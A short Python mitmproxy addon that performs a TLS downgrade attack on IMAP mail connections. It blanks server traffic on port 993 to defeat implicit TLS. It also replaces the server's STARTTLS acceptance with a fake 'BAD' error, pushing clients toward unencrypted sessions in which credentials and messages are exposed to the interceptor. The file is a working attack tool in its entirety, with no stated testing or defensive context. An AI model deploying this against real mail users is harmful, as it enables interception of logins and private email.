from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
import base64
import re

class imap_TCP:
    def __init__(self) -> None:
        self.view = ctx.master.addons.get("view")
    
    def tcp_message(self, flow:tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port
        
        if not msg.from_client:
            server_msg = bytearray(msg.content)
            if flow.server_conn.peername[1] == 993: # force client not to use implicit TLS
                server_msg = b''
                msg.content = server_msg

            ctx.log.info(msg.from_client)
            if b'OK Begin TLS negotiation now' in server_msg:
                ctx.log.warn('client sends starttls')
                server_msg= b'BAD Error in IMAP command received by server.\r\n'
                msg.content = server_msg
                ctx.log.info(msg.content)

addons = [imap_TCP()]